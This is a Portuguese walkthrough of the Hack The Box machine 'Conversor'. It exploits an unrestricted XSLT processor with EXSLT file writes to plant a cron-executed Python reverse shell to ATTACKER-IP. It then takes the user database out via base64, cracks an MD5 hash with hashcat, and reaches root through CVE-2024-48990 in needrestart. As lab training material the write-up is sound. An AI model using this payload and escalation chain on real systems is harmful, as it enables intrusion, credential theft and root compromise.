---
title: "Hack The Box - Conversor"
author: "imendes"
date: 2026-01-18
subject: "HTB Walkthrough"
description: "Walkthrough da máquina Conversor (HTB), explorando falhas no processamento de XSLT com uso de EXSLT para escrita arbitrária de arquivos e posterior escalada de privilégios via CVE-2024-48990."
keywords: ["HTB", "Conversor", "XSLT", "EXSLT", "file write", "needrestart", "CVE-2024-48990", "privilege escalation"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [Hack The Box Machines, Linux, Easy]
---

## Introdução

Este relatório documenta o processo de exploração da máquina **Conversor** da plataforma **Hack The Box**.  
A máquina apresenta uma aplicação web que converte arquivos XML do Nmap em páginas HTML utilizando transformações XSLT. A vulnerabilidade principal reside na ausência de restrições no processamento de arquivos XSLT, permitindo o uso da extensão **EXSLT** para escrita arbitrária de arquivos no sistema.  
O objetivo foi obter acesso inicial via exploração da funcionalidade XSLT e, em seguida, realizar a **escalada de privilégios** explorando a vulnerabilidade **CVE-2024-48990** no utilitário `needrestart`.

## Metodologia

A metodologia aplicada seguiu as seguintes fases:

- **Coleta de informações** – identificação de portas e serviços expostos via Nmap.  
- **Enumeração** – análise da aplicação web e revisão do código-fonte disponível.  
- **Exploração** – escrita arbitrária de arquivos via extensão EXSLT e execução de reverse shell através de cron job.  
- **Manutenção de acesso** – obtenção de credenciais SSH via extração e quebra de hash do banco de dados SQLite.  
- **Escalada de privilégios** – exploração da vulnerabilidade CVE-2024-48990 no binário `needrestart` para obter acesso root.

## Coleta de Informações

### Varredura Nmap

Durante a varredura inicial, foram identificados os seguintes serviços expostos:

**Serviços identificados:**

| Porta    | Serviço | Versão | Observação                           |
| :------- | :------ | :----- | :----------------------------------- |
| 22/tcp   | SSH     | OpenSSH | Acesso remoto                       |
| 80/tcp   | HTTP    | -      | Aplicação web de conversão XML/HTML |

### Enumeração de Serviços

Durante a análise da aplicação web, foi identificado que o serviço principal realizava a conversão de arquivos XML gerados pelo Nmap em páginas HTML através de transformações XSLT.

A aplicação disponibilizava o código-fonte no caminho `/about`, revelando detalhes importantes da implementação:

- O parser XML possui proteção contra **XXE (XML External Entity)**, impedindo a exploração dessa vulnerabilidade.
- O processamento de arquivos XSLT **não possui restrições**, permitindo o uso de extensões e funções avançadas.
- Ambos os arquivos (XML e XSLT) são fornecidos pelo usuário sem validação rigorosa de conteúdo.

#### Identificação da Versão XSLT

Para determinar o processador XSLT utilizado, foi submetido o seguinte payload:

```xslt
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />Version: <xsl:value-of select="system-property('xsl:version')" />
<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

A página resultante exibiu as seguintes informações:

```
Version: 1.0
Vendor: libxslt 
Vendor URL: http://xmlsoft.org/XSLT/
```

Esta identificação confirmou o uso de **libxslt**, que suporta a extensão **EXSLT**, incluindo a função `exsl:document` para escrita de arquivos no sistema.

## Exploração

### Estratégia de Ataque

A exploração foi realizada através das seguintes etapas:

1. Envio de requisição inicial com arquivos XML e XSLT legítimos para obter um UUID válido.
2. Utilização do payload XSLT com a extensão EXSLT para escrever arquivos maliciosos no sistema.
3. Execução do arquivo python por meio de um cronjob presente no servidor.

### Análise do Vetor de Ataque

Durante a enumeração local da aplicação, foi identificado no arquivo `install.md` a presença de um **cron job** que executa automaticamente todos os arquivos Python no diretório `/var/www/conversor.htb/scripts/`:

```bash
/var/www/conversor.htb/scripts/*.py
```

Esta configuração permitiu a execução automática de código malicioso após a escrita do arquivo.

### Payload EXSLT

O seguinte payload XSLT foi utilizado para escrever um script Python malicioso no diretório de scripts:

```xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/hello.py" method="text">
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER-IP", PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty

pty.spawn("sh")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

Ao submeter este payload, o arquivo `hello.py` foi criado no diretório de scripts e executado automaticamente pelo cron job, estabelecendo um **reverse shell** para o atacante.

### Manutenção de Acesso

Após estabilizar o shell como usuário `www-data`, o atacante localizou o banco de dados da aplicação:

```bash
www-data@conversor:~/conversor.htb/instance$ ls
users.db
```

O banco de dados foi transferido para a máquina do atacante utilizando codificação Base64 e copiando e colando o resultado.:

```bash
www-data@conversor:~/conversor.htb/instance$ base64 users.db
U1FMaXRlIGZvcm1hdCAzABAAAQEAQCAgAAAAPQAAAAYAAAAAAAAAAAAAAAIAAAAEAAAAAAAAAAAA
AAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9AC5XSg0P+AAFDgcADzcPzQ7l
...
```
```bash
attacker@machine:~/$ echo "U1FMaXRlIGZvcm1hdCAzABAAAQEAQCAgAAAAPQAAAAYAAAAAAAAAAAAAAAIAAAAEAAAAAAAAAAAA ..." | base64 -d > users.db
```

#### Extração de Credenciais

Com acesso ao banco de dados, foi possível extrair o hash do usuário **fismathack**:

```bash
sqlite> SELECT * FROM users;
1|fismathack|USER-HASH
```

O hash foi identificado como **MD5** e quebrado com sucesso utilizando **hashcat** e a wordlist **rockyou.txt**:

```bash
hashcat -m 0 -a 0 USER-HASH /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

A senha obtida foi reutilizada para acesso SSH:

```bash
ssh fismathack@conversor.htb
```

Com o acesso estabelecido, a flag de usuário foi recuperada:

```bash
fismathack@conversor:~$ ls
user.txt
```

## Escalada de Privilégios

### Enumeração de Privilégios Sudo

Verificando as permissões sudo do usuário:

```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

O binário `needrestart` pode ser executado com privilégios root sem necessidade de senha.

### Identificação da Vulnerabilidade

Verificando a versão do `needrestart`:

```bash
fismathack@conversor:~$ needrestart --version

needrestart 3.7 - Restart daemons after library updates.
```

Confirmando a versão do sistema operacional:

```bash
fismathack@conversor:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
```

A versão **3.7** do `needrestart` no **Ubuntu 22.04.5 LTS** é vulnerável à **CVE-2024-48990**, que permite escalada local de privilégios através da manipulação de variáveis de ambiente do interpretador Python.

### Exploração da CVE-2024-48990

A exploração foi realizada utilizando a PoC disponível em:  
[https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing)

O atacante executou o script runner na primeira sessão e, em uma segunda sessão SSH, executou o seguinte comando:

```bash
fismathack@conversor:~$ sudo needrestart -r a
```

Este comando força a reinicialização de serviços. A PoC explora a capacidade de atribuir um diretório malicioso à variável de ambiente do interpretador Python. Com isso, o atacante pode inserir um arquivo binário malicioso que realiza a cópia do programa `sh` com permissões SUID, permitindo a execução de comandos como root.

Saída da exploração:

```
Waiting for norestart execution...
Ensure you remove yourself from sudoers on the poc file after
sudo sed -i '/ALL ALL=NOPASSWD: \/tmp\/poc/d' /etc/sudoers
As well as remove excess files created:
rm -rf malicious/ poc
Got shell!, delete traces in /tmp/poc, /tmp/malicious
```

Com acesso root, a flag foi recuperada:

```bash
cd /root/
ls
root.txt  scripts
cat root.txt
```

### Limpeza de Vestígios

Após a exploração, os arquivos temporários foram removidos:

```bash
fismathack@conversor:/tmp$ rm -r malicious
fismathack@conversor:/tmp$ rm runner.sh
```

**Resumo técnico:**

| Etapa          | Vetor de Ataque                      | Resultado       |
| :------------- | :----------------------------------- | :-------------- |
| Acesso inicial | EXSLT file write + cron job Python   | Reverse shell   |
| Enumeração     | users.db → hash MD5 de fismathack    | Credenciais SSH |
| Escalada       | CVE-2024-48990 em needrestart 3.7    | Root shell      |

## Referências

- [EXSLT - exsl:document](https://exslt.github.io/exsl/elements/document/index.html)
- [CVE-2024-48990 PoC](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing/tree/main)
- [Needrestart Privilege Escalation](https://nvd.nist.gov/vuln/detail/CVE-2024-48990)
